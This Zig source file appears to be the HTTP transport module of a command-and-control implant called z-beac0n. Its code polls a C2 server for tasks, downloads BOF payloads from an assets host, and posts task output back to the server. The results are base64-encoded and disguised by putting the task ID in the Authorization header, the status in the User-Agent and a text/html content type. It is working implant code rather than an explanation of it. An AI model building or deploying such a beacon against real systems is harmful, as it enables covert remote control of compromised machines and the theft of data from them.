const std = @import("std");
const assert = std.debug.assert;
const bof = @import("bof_launcher_api");
const beacon = @import("bof_api").beacon;
const zbeac0n = @import("z-beac0n-common.zig");

comptime {
    @import("bof_api").embedFunctionCode("__stackprobe__");
    @import("bof_api").embedFunctionCode("memcpy");
    @import("bof_api").embedFunctionCode("memset");
    @import("bof_api").embedFunctionCode("memmove");
}

pub const std_options = std.Options{
    .http_disable_tls = true,
    .log_level = .info,
};

const debug_proxy_enabled = false;
const debug_proxy_host = "127.0.0.1";
const debug_proxy_port = 8080;

pub export fn netInit(allocator: *anyopaque) callconv(.c) *anyopaque {
    const alloc: *std.mem.Allocator = @ptrCast(@alignCast(allocator));

    return netHttpInit(alloc.*) catch unreachable;
}

fn netHttpInit(allocator: std.mem.Allocator) !*std.http.Client {
    // create proxy if set so
    const http_proxy = if (debug_proxy_enabled) blk: {
        const proxy = try allocator.create(std.http.Client.Proxy);
        proxy.* = .{
            .protocol = .plain,
            .authorization = null,
            .host = debug_proxy_host,
            .port = debug_proxy_port,
            .supports_connect = true,
        };
        break :blk proxy;
    } else null;

    // create and return http_client
    const http_client = try allocator.create(std.http.Client);
    http_client.* = .{
        .allocator = allocator,
        .http_proxy = http_proxy,
    };

    return @ptrCast(http_client);
}

pub export fn netConnect(state: *anyopaque, connectionType: zbeac0n.netConnectionType, extra_data: ?*anyopaque) callconv(.c) ?*anyopaque {
    const s: *zbeac0n.State = @ptrCast(@alignCast(state));

    const res = netHttpConnect(s, connectionType, extra_data) catch |err| switch (err) {
        error.OutOfMemory => return null,
        else => return null,
    };

    return @ptrCast(res);
}

fn netHttpConnect(s: *zbeac0n.State, connectionType: zbeac0n.netConnectionType, extra_data: ?*anyopaque) !*std.http.Client.Connection {
    const http_client: *std.http.Client = @ptrCast(@alignCast(s.net_client));

    var address: []const u8 = undefined;
    var host: []const u8 = undefined;
    var port: u16 = undefined;
    const proto: std.http.Client.Protocol = .plain;

    _ = extra_data;

    if (connectionType == zbeac0n.netConnectionType.Heartbeat) {
        address = s.c2_host;
    } else if (connectionType == zbeac0n.netConnectionType.ResourceFetch) {
        address = s.assets_host;
    } else if (connectionType == zbeac0n.netConnectionType.TaskResult) {
        address = s.c2_host;
    }

    var iter = std.mem.splitScalar(u8, address, ':');
    const h = iter.next() orelse return error.BadData;
    host = try s.allocator.dupe(u8, h);
    port = try std.fmt.parseInt(u16, iter.next() orelse return error.BadData, 10);

    const conn = try http_client.connect(host, port, proto);
    conn.closing = true;
    if (http_client.http_proxy != null)
        conn.proxied = true;

    return conn;
}

pub export fn netDisconnect(state: *anyopaque, net_connection: *anyopaque) callconv(.c) void {
    //const s: *zbeac0n.State = @ptrCast(@alignCast(state));
    //const conn: *std.http.Client.Connection = @ptrCast(@alignCast(net_connection));
    //
    _ = net_connection;
    _ = state;

    std.log.info("in HTTPS netDisconnect", .{});

    //conn.close(s.allocator);
}

pub export fn netExchange(
    state: *anyopaque,
    connectionType: zbeac0n.netConnectionType,
    net_connection: *anyopaque,
    len: *u32,
    extra_data: ?*anyopaque,
) callconv(.c) ?*anyopaque {
    const s: *zbeac0n.State = @ptrCast(@alignCast(state));
    const conn: *std.http.Client.Connection = @ptrCast(@alignCast(net_connection));

    const res = netHttpExchange(s, connectionType, conn, len, extra_data) catch |err| switch (err) {
        error.OutOfMemory => return null,
        else => return null,
    };


    if (res != null) {
        return @ptrCast(res.?.ptr);
    }
    return null;
}

fn netHttpExchange(
    s: *zbeac0n.State,
    connectionType: zbeac0n.netConnectionType,
    conn: *std.http.Client.Connection,
    len: *u32,
    extra_data: ?*anyopaque,
) !?[]u8 {
    const http_client: *std.http.Client = @ptrCast(@alignCast(s.net_client));

    var http_method: std.http.Method = undefined;
    var uri: std.Uri = undefined;
    var body_data: ?[]u8 = null;
    var bof_res: ?*zbeac0n.BofRes = null;
    var masked_body_len: u32 = 0;

    //
    // PREAPRE REQUEST FOR SENDING
    //

    var http_reqOptions: std.http.Client.RequestOptions = .{
        .keep_alive = true,
        .connection = conn,
    };

    // query C2 for new tasks
    if (connectionType == .Heartbeat) {
        http_method = .GET;
        const url = try std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint });
        uri = try std.Uri.parse(url);

        // apply HTTP header transforms
        _ = s.implant_actions.netMasquerade(s, connectionType, &http_reqOptions, null, len);

    // fetching for a resource as indicated in 'extra_data'
    } else if (connectionType == .ResourceFetch and extra_data != null) {

        // in case of ResourceFetch exchange extra_data is a  0-terminated path to the resource
        const bof_path: []const u8 = std.mem.sliceTo(@as([*:0]const u8, @ptrCast(extra_data)), 0);

        std.log.info("in HTTPS netExchange: ResurceFetch {s}", .{bof_path});

        http_method = .GET;
        const url = try std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.assets_host, bof_path });
        uri = try std.Uri.parse(url);

        // apply HTTP header transforms
        _ = s.implant_actions.netMasquerade(s, connectionType, &http_reqOptions, null, len);

    // returning results of an already completed task
    } else if (connectionType == .TaskResult and extra_data != null) {
        // in case of TaskResult exchange extra_data is a length len.*

        bof_res = @as(*zbeac0n.BofRes, @ptrCast(@alignCast(extra_data)));

        http_method = std.http.Method.POST;
        const url = try std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint });
        uri = try std.Uri.parse(url);

        // apply HTTP header transforms and
        // mask body data according to transforms implemented in netMasquerade(...) and assign it to 'body_data' which will be sent
        masked_body_len = 0;
        const masked_body: ?[*]u8 = @ptrCast(s.implant_actions.netMasquerade(
            s,
            connectionType,
            &http_reqOptions,
            bof_res,
            &masked_body_len,
        ));
        if (masked_body) |body| {
            body_data = @as([*]u8, @ptrCast(@constCast(body)))[0..masked_body_len];
        }
    }

    //
    // SENDING REQUEST
    //

    // create HTTP request
    var http_request = try http_client.request(http_method, uri, http_reqOptions);
    defer http_request.deinit();

    // in case of returning tasks results we send POST request
    if (connectionType == .TaskResult and body_data != null) {
        // sends HTTP body and header
        http_request.transfer_encoding = .{ .content_length = body_data.?.len };
        try http_request.sendBodyComplete(body_data.?);

    // in other cases we send GET
    } else {
        // sends HTTP header only
        try http_request.sendBodiless();
    }

    //
    // RESPONSE PROCESSING
    //

    var response = try http_request.receiveHead(&.{});
    if (response.head.status != .ok) {
        return error.BadData;
    }

    // get body content
    const body = try response.reader(&.{}).allocRemaining(s.allocator, .unlimited);
    errdefer s.allocator.free(body);

    // update body length
    len.* = @intCast(body.len);

    if (connectionType != .TaskResult) {
        return body;
    }

    return null;
}

pub export fn netMasquerade(state: *anyopaque, connectionType: zbeac0n.netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.c) ?*anyopaque {
    const s: *zbeac0n.State = @ptrCast(@alignCast(state));
    const http_reqOptions: *std.http.Client.RequestOptions = @ptrCast(@alignCast(hdr_to_mask));

    const res = netHttpMasquerade(s, connectionType, http_reqOptions, data_to_mask, len) catch |err| switch (err) {
        error.OutOfMemory => return null,
        else => return null,
    };

    if (res != null) {
        return @ptrCast(res.?.ptr);
    } else return null;
}

fn netHttpMasquerade(s: *zbeac0n.State, connectionType: zbeac0n.netConnectionType, http_reqOptions: *std.http.Client.RequestOptions, data_to_mask: ?*anyopaque, len: *u32) !?[]u8 {

    //
    // Implement transforms based on type of the current connection
    //
    if (connectionType == zbeac0n.netConnectionType.Heartbeat) {

        // header transforms: implantID -> HTTP authorization header
        http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value{
            .override = s.implant_identity,
        };
    } else if (connectionType == zbeac0n.netConnectionType.ResourceFetch) {

        // header transforms: implantID -> HTTP authorization header
        http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value{
            .override = s.implant_identity,
        };
    } else if (connectionType == zbeac0n.netConnectionType.TaskResult) {

        // sth is wrong: nothing to mask
        const bof_res: ?*zbeac0n.BofRes = @ptrCast(@alignCast(data_to_mask));
        if (bof_res == null) return null;

        // header transforms: taskID -> HTTP authorization header
        const taskID = std.mem.sliceTo(bof_res.?.taskID, 0);
        http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value{
            .override = taskID,
        };

        // header transforms: string(result:{d}) -> HTTP user_agent header
        http_reqOptions.headers.user_agent = std.http.Client.Request.Headers.Value{
            .override = try std.fmt.allocPrint(s.allocator, "result:{d}", .{bof_res.?.status_code}),
        };

        // header transforms: content_type -> "text/html"
        http_reqOptions.headers.content_type = std.http.Client.Request.Headers.Value{
            .override = "text/html",
        };

        // data / body transforms: base64(body)
        if (bof_res.?.output != null) {
            const new_body_len = s.base64_encoder.calcSize(bof_res.?.len);
            const out_b64 = try s.allocator.alloc(u8, new_body_len);
            errdefer s.allocator.free(out_b64);

            const body = @as([*]u8, @ptrCast(@constCast(bof_res.?.output)))[0..bof_res.?.len];
            _ = s.base64_encoder.encode(out_b64, body);

            std.log.info("Bof launcher output (base64): {s}", .{out_b64});

            // update len and return pointer to new buffer
            len.* = @intCast(new_body_len);
            return out_b64;
        }
    }

    return null;
}

pub export fn netUnmasquerade(state: *anyopaque, connectionType: zbeac0n.netConnectionType, pkt_data: ?*anyopaque, len: *u32) callconv(.c) ?*anyopaque {
    const s: *zbeac0n.State = @ptrCast(@alignCast(state));

    const res = netHttpUnmasquerade(s, connectionType, pkt_data, len) catch |err| switch (err) {
        error.OutOfMemory => return null,
        else => return null,
    };

    if (res != null) {
        return @ptrCast(res.?.ptr);
    } else return null;
}

fn netHttpUnmasquerade(s: *zbeac0n.State, connectionType: zbeac0n.netConnectionType, pkt_data: ?*anyopaque, len: *u32) !?[]u8 {
    _ = connectionType;
    _ = s;

    //TODO: else if based on connection type
    if (pkt_data != null) {
        const body = @as([*]u8, @ptrCast(@constCast(pkt_data.?)))[0..len.*];
        // TODO: performs all needed transforms
        len.* = @intCast(body.len);
        return body;
    }

    return null;
}

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    @import("bof_api").init(adata, alen, .{});

    return 0;
}
